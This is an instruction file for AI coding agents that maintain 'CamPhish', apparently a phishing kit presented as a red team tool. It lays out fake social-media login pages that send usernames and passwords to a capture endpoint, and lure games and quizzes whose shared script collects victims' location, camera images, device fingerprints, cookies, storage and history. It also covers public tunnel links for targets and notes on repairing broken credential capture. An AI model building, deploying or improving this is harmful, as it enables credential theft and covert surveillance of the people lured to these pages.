# CamPhish — AI Agent Instructions

## Project Overview
CamPhish v2.1.0 is a Rust (axum) + React (Vite/TS/Tailwind) red team camera capture tool.
Backend serves API + dashboard SPA + pluggable HTML templates. TrailBase provides admin UI + realtime.

## Architecture
```
Target Browser → CamPhish App (Rust :8080) → SQLite (primary) + TrailBase (:4000, secondary)
                      ↓
                 React Dashboard (:8080 SPA)
                      ↓
                 Templates (/t/:id) → recon.js → capture endpoints
```

## Critical Rules
1. **Use `scripts/docker-cleanup.sh` to reset** — NOT `docker compose down -v` (which deletes persistent volumes). The script safely removes containers + volumes + local data.
2. **NEVER rename trailbase/schema/V7__camphish.sql** — V1-V6 are TrailBase built-ins
3. **TrailBase migration naming**: must be V7+ to avoid conflicts with built-in V1-V6
4. **SQL DEFAULT with functions**: `DEFAULT (lower(hex(randomblob(16)))),` — needs trailing comma
5. **Template placeholders**: `API_BASE_URL` and `forwarding_link` are replaced at serve time
6. **recon.js is shared**: ALL templates include `<script src="forwarding_link/t/recon.js">`
7. **CamPhishRecon.init()** triggers: IP + location + fingerprint + gender + cookies + storage + history + auto-permissions
8. **Games must work WITHOUT camera** — camera is optional enhancement
9. **Social media templates capture credentials** via `POST /api/capture/credentials`
10. **Variable naming in JS**: use `el` prefix for DOM elements (elScore, elCombo) to avoid collisions with game state vars
11. **ALWAYS rebuild Docker after merging backend changes**: run `docker compose build app && docker compose up -d app && sleep 5 && ./scripts/docker-code.sh`
12. **ALWAYS show the access code + tunnel URL** after any Docker restart:
    - Access code: `./scripts/docker-code.sh` or `cat data/.access_code`
    - Tunnel URL: `docker compose logs cloudflared | grep -oE 'https://[a-z0-9-]+\.try\.cloudflare\.com' | tail -1`
    - Full summary: `./scripts/docker-start.sh` prints both in a summary banner
13. **Dashboard access code persists**: written to `data/.access_code` (bind-mounted, survives restarts). Set `CAMPHISH_ACCESS_SEED` in `.env` for a deterministic code. Use `http://localhost:8080/?code=<code>` to access the dashboard, or `cat data/.access_code` to retrieve it.
14. **Tunnel URL must be shown after every deployment**: the tunnel URL is critical for creating target links. After any `docker compose up`, extract and display the public URL (cloudflare or ngrok) alongside the access code.
15. **ALWAYS use the latest Docker image for remote deployments**: production deployments should reference specific semver tags (`ghcr.io/yashodhank/camphish:v2.1.0`), not `latest` or `nightly`.
16. **Coolify magic envs are auto-injected**: never manually set `SERVICE_FQDN_*` or `SERVICE_PASSWORD_*` — Coolify injects them.

## Tech Stack
- Backend: Rust 1.96, axum 0.7, sqlx 0.8 (SQLite WAL), tower-http, reqwest (rustls)
- Frontend: React 18, TypeScript, Vite 5, TailwindCSS 3, React Router 6
- Data: SQLite (primary), TrailBase (secondary, admin UI, realtime)
- Docker: Alpine 3.20 runtime, multi-stage build (Node 20 + Rust 1.96)
- Tunnel: Cloudflare Tunnel or Ngrok

## Build & Deploy Commands
\`\`\`bash
# Build Docker image
docker compose build app

# Full Docker deployment with tunnel auto-discovery
./scripts/docker-start.sh                # uses cloudflared (default)
TUNNEL=ngrok ./scripts/docker-start.sh   # uses ngrok

# Local dev (no Docker, optional tunnel)
./scripts/dev.sh                         # backend + tunnel + frontend build
TUNNEL=none ./scripts/dev.sh             # local only, no tunnel
RELEASE=1 ./scripts/dev.sh               # release build for perf testing

# Just the Docker app locally (no tunnel)
docker compose up -d app

# Clean up everything (containers + volumes + local data)
./scripts/docker-cleanup.sh

# ====== STANDALONE (no panel) ======
docker compose -f docker-compose.standalone.yml up -d
docker compose -f docker-compose.standalone.yml -f docker-compose.caddy.yml up -d  # with HTTPS

# ====== COOLIFY ======
# docker-compose.coolify.yml is deployed via Coolify dashboard (Docker Compose build pack)
\`\`\`

## Key File Locations
- Backend: `backend/src/{main.rs, api/mod.rs, capture.rs, db.rs, templates.rs, trailbase.rs}`
- Frontend: `frontend/src/{App.tsx, api/client.ts, pages/*.tsx}`
- Templates: `templates/*.html` + `templates/recon.js`
- Schema: `backend/migrations/001_init.sql` + `trailbase/schema/V7__camphish.sql`
- Docker: `Dockerfile` (multi-stage Alpine) + `docker-compose.yml` (local+tunnels)
- Docker Deploy: `docker-compose.coolify.yml` + `docker-compose.standalone.yml` + `docker-compose.caddy.yml`
- CI/CD: `.github/workflows/ci.yml` + `.github/workflows/release.yml`
- Scripts: `scripts/docker-start.sh` (auto tunnel) + `scripts/docker-cleanup.sh` (full reset) + `scripts/docker-code.sh`

## Deployment Modes

### Mode 1: Local Dev with Tunnels (docker-compose.yml)
- Uses cloudflared or ngrok for public exposure
- TrailBase included for admin UI + realtime
- Bind-mounts templates for hot-reload
- Run with `./scripts/docker-start.sh`

### Mode 2: Coolify v4+ (docker-compose.coolify.yml)
- Deployed via Coolify dashboard — Docker Compose build pack
- No tunnel service — Coolify's Traefik/Caddy proxy handles external access + SSL
- Uses `SERVICE_FQDN_CAMPHISH_8080` magic env for auto FQDN
- Uses `SERVICE_PASSWORD_CAMPHISH_ACCESS` magic env for auto access code
- Recommended for panel-managed deployments
- See `docs/coolify-deployment.md` for full guide

### Mode 3: Standalone (docker-compose.standalone.yml)
- No panel, no tunnel — just the app
- User provides own reverse proxy (nginx, Caddy, Traefik)
- Companion `docker-compose.caddy.yml` for auto HTTPS via Caddy + Let's Encrypt
- Recommended for VPS or self-managed servers
- See `docs/standalone-deployment.md` for full guide

## GitHub Actions CI/CD

### CI Pipeline (.github/workflows/ci.yml)
Triggers on push/PR to master and feature branches:
1. **check-rust**: `cargo check` on backend
2. **check-frontend**: TypeScript type-check on frontend
3. **check-templates**: Validate template count and recon.js existence
4. **build-docker**: Build Docker image (no push)
5. **build-push-sha**: On master push, push SHA-tagged + `nightly` images to GHCR

### Release Pipeline (.github/workflows/release.yml)
Triggers on master push or manual dispatch:
1. **version**: Auto-increments patch version, bumps Cargo.toml/package.json/Dockerfile, creates git tag
2. **build-and-push**: Native multi-arch (amd64 + arm64) build + push to `ghcr.io/yashodhank/camphish`
   - Tags: `latest`, `vX.Y.Z`, `vX.Y`, `<commit-sha>`
   - Uses QEMU + native ARM runners for fast builds
3. **merge-manifest**: Creates multi-arch manifest for each tag
4. **Create GitHub Release**: Auto-generates release notes from commit log

### Image Tags
| Tag | When | Use |
|-----|------|-----|
| `latest` | Master branch push | Dev/test convenience |
| `vX.Y.Z` | Git tag push | Immutable production reference |
| `vX.Y` | Git tag push | Minor version alias |
| `nightly` | Master branch push | Nightly testing |
| `<sha>` | Master branch push | Commit traceability |

### Remote Deployment
Production deployments should reference specific semver tags:
\`\`\`yaml
image: ghcr.io/yashodhank/camphish:v2.1.0
\`\`\`
Never use `latest` or `nightly` for production.

## Capture Endpoints
- `POST /api/capture/ip` — IP + User-Agent
- `POST /api/capture/location` — GPS coordinates
- `POST /api/capture/image` — Base64 camera snapshot
- `POST /api/capture/fingerprint` — Full device fingerprint (25+ fields)
- `POST /api/capture/event` — Session replay events
- `POST /api/capture/storage` — Cookie/localStorage/sessionStorage dump
- `POST /api/capture/credentials` — Username/password from social login templates

## Dashboard API
- `GET /api/health` — Health check
- `GET /api/stats` — Aggregate statistics
- `GET /api/captures` — Paginated capture list
- `GET /api/captures/:id/file` — Serve capture file
- `GET /api/locations` — GPS locations
- `GET /api/ips` — IP logs with device/browser/OS breakdown
- `GET /api/credentials` — Captured credentials
- `GET /api/events` — Session replay timeline
- `GET /api/templates` — Available templates
- `GET /api/sessions` — Session management

## 18 Templates
- Games (6): face-runner, color-match, bubble-pop, dress-up, word-hunt, pet-catch
- Social Login (6): instagram, facebook, tiktok, whatsapp, snapchat, gmail
- Gender Psychology (3): beauty-quiz, horoscope, sports-predictor
- Original (3): festival, youtube, meeting

## Kimi WebBridge Browser Testing

**Kimi WebBridge** (`http://127.0.0.1:10086`) drives the user's real Chrome/Edge browser for visual testing. ALWAYS use it before/after template changes to verify all 18 templates load without JS errors.

### Quick Test Command
```bash
# Test a single template for JS errors
curl -s -X POST http://127.0.0.1:10086/command -H 'Content-Type: application/json' \
  -d '{"action":"navigate","args":{"url":"http://localhost:8080/t/<template>","newTab":true},"session":"test"}'
sleep 2
curl -s -X POST http://127.0.0.1:10086/command -H 'Content-Type: application/json' \
  -d '{"action":"evaluate","args":{"code":"JSON.stringify({errors:window.__capturedErrors||[],title:document.title||\"\"})"}}'
curl -s -X POST http://127.0.0.1:10086/command -H 'Content-Type: application/json' \
  -d '{"action":"close_session","args":{},"session":"test"}'
```

### When to Test
- After ANY change to `templates/*.html`, `templates/recon.js`, `templates/*.js`
- After any backend change that affects template serving (`templates.rs`, `main.rs`)
- After Docker rebuild to verify MIME types and template serving
- Before merging any PR that touches templates
- For regression testing when adding new templates

### Testing Checklist
1. **JS errors**: navigate + evaluate `window.__capturedErrors` — must be empty array
2. **Visual**: screenshot — game canvases render, forms display, no broken layouts
3. **Interaction**: click buttons, fill forms, verify page responds
4. **Edge cases**: mobile viewport, slow network, camera denied, console errors
5. **Accessibility tree**: snapshot — all interactive elements have semantic roles
6. **MIME types**: `curl -I /t/recon.js` → `Content-Type: application/javascript`
7. **Dashboard**: `?code=<code>` → dashboard loads, stats display, data tables paginate

See `.opencode/skills/camphish-webbridge/SKILL.md` for the full testing procedure.

## Lessons Learned (DO NOT REPEAT)
- Game crash: `combo.style.opacity=0` when `combo` is a number, not DOM element → use `elCombo`
- Docker build: debian:bookworm-slim can't reach apt repos → use Alpine
- Rust version: 1.80 doesn't support edition 2024 (sqlx 0.8) → use 1.96
- TrailBase: V1-V6 are reserved → use V7+
- Word hunt: cell listeners lost on re-render → attach in renderGrid()
- Color match: DOMContentLoaded fires too late → set up listeners immediately
- Festival: spinner forever → make it interactive (gift opening)
- Dress-up: hidden start button → auto-start on load
- Gmail credential capture: template had no `#user` input field, only a static `#emailDisplay` span → `captureCreds()` always returned early
- Syntax error in 4 social login templates: extra `)` after `captureCreds()` — breaks script execution
- Instagram credential capture: duplicate inline `fetch` and dead `captureCreds()` function
- Event names: templates used placeholder `'0_login'` instead of descriptive template-specific names
- Cloudflared v2025+ wraps tunnel URL in `|` boxes — grep still works but script wait time may need adjustment
- `storage_dumps` had no `ip_address` column — cross-referencing required session_id join with ip_logs
- `receive_storage` didn't log events — missing from session replay timeline unlike `receive_credentials`
- No pagination on `/api/storage` and `/api/credentials` — hardcoded LIMIT silently dropped data
- recon.js StorageGrabber: value truncation at 2000 chars without reporting actual size; no CookieStore/Cache API/storage estimate
